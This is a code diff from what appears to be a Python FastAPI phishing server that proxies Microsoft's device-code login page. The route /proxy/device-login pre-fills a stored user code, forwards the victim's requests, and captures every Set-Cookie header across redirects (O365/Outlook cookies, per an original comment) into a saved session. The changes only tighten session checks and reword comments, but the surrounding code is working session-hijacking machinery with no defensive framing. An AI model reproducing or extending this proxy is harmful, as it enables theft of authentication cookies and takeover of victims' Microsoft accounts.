@@ -135,15 +135,15 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# FIXED PROXY - Opens the ORIGINAL Microsoft device auth page
+# PROXY - Opens the ORIGINAL Microsoft device auth page
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
         raise HTTPException(403, "Proxy disabled")
 
     session = await get_session(device_code)
-    if not session:
-        raise HTTPException(404, "Session expired")
+    if not session or "user_code" not in session:
+        raise HTTPException(404, "Session expired or invalid")
 
     cookie_jar = httpx.Cookies()
     for n, c in session.get("cookies", {}).items():
@@ -156,12 +156,12 @@ async def proxy(device_code: str, request: Request):
         resp = await c.request(
             method=request.method,
             url=target_url,
-            params={"input": session.get("user_code")},
+            params={"input": session["user_code"]},
             headers={k: v for k, v in request.headers.items() if k.lower() not in ["host", "content-length", "cookie"]},
             content=await request.body() if request.method != "GET" else None
         )
 
-    # Capture all cookies (O365/Outlook included)
+    # Capture all cookies from every redirect
     captured = {}
     for past in list(resp.history) + [resp]:
         for h in past.headers.getlist("set-cookie"):
@@ -175,7 +175,7 @@ async def proxy(device_code: str, request: Request):
     session["cookies"].update(captured)
     await save_session(device_code, session)
 
-    # Stream original Microsoft page back
+    # Stream the original Microsoft page
     content = resp.content
     if "text/html" in resp.headers.get("content-type", ""):
         html = resp.text
